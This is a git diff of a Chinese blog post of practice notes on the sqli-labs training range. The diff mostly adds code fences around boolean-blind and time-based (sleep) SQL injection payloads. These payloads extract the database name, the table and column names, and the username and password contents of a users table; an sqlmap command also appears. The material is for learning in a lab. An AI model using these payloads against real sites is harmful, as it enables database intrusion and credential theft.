@@ -3,7 +3,7 @@ title: sqli1-10练习
 date: 2024-11-24 17:12:33
 categories: SQL
 tags: sql
-updated: 2024-11-24 17:12:33
+updated: 2026-01-20 20:38:50
 ---
 # sqli开头简介
 sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！
@@ -59,25 +59,47 @@ sqlmap -u http://sql/sqli-labs-master/Less-1/id=1 --dbs 查看对应的库
 之后还会专门出一个sqlmap的教程，这里就不多说了
 
 # bool盲注
+
+```sql
 ?id=1'and length((select database()))>9--+
-#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
+```
+大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
+```sql
 ?id=1'and ascii(substr((select database()),1,1))=115--+
-#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
- 
+substr("78909",1,1)=7 
+substr(a,b,c)
+```
+
+a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
+
+```sql
 ?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
+```
 判断所有表名字符长度。
+
+```sql
 ?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
+```
 逐一判断表名
- 
+
+```sql
 ?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
+```
+
 判断所有字段名的长度
+```sql
 ?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
+```
 逐一判断字段名。
  
- 
-?id=1' and length((select group_concat(username,password) from users))>109--+
+ ```sql
+ ?id=1' and length((select group_concat(username,password) from users))>109--+
+ ```
+
 判断字段内容长度
+```sql
 ?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
+```
 逐一检测内容。
 
 ## 双查询注入
@@ -118,27 +140,41 @@ count()：聚合函数
 
 
 # 时间盲注
+```sql
 ?id=1' and if(1=1,sleep(5),1)--+
+```
 判断参数构造。
+```sql
 ?id=1'and if(length((select database()))>9,sleep(5),1)--+
+```
 判断数据库名长度
- 
+```sql
 ?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+```
 逐一判断数据库字符
+```sql
 ?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
+```
 判断所有表名长度
- 
+```sql
 ?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
+```
 逐一判断表名
+```sql
 ?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
+```
 判断所有字段名的长度
- 
+```sql
 ?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
+```
 逐一判断字段名。
+```sql
 ?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
+```
 判断字段内容长度
- 
+```sql
 ?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
+```
 逐一检测内容。
 
 
